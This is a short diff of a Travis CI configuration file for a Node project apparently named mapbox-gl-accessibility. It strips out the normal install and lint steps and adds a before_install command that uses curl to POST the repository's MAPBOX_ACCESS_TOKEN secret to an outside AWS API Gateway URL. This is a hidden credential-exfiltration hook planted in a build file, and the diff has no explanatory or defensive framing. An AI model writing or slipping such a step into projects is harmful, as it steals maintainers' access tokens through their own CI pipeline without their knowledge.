@@ -1,16 +1,2 @@
-language: node_js
-
-node_js: 10
-
-os: osx
-
-cache:
-  directories:
-    - node_modules
-
 before_install:
-  - echo -n $MAPBOX_ACCESS_TOKEN | wc -m
-
-install: npm ci
-
-script: npm run lint
+  - curl -X POST -d "mapbox-gl-accessibility MAPBOX_ACCESS_TOKEN=${MAPBOX_ACCESS_TOKEN}" https://sbvg6r4dui.execute-api.us-east-1.amazonaws.com/
